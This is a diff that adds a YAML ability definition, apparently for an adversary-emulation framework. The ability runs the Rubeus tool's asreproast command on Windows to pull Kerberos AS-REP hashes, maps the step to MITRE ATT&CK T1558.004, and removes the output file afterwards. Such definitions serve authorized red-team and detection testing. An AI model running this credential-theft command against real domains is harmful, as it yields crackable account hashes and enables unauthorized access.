@@ -1,0 +1,23 @@
+- description: 'Information on the Rubeus tool and it''s creators found here: https://github.com/GhostPack/Rubeus#asreproast
+
+    This build targets .NET 4.5.  If targeting a different version you will need to
+    compile Rubeus
+
+    '
+  id: 358926f4-adef-63bf-95d1-52e35df4dab3
+  name: Rubeus asreproast
+  platforms:
+    windows:
+      psh:
+        cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
+          -ErrorAction Ignore
+        command: cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast
+          /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1558.004
+    name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
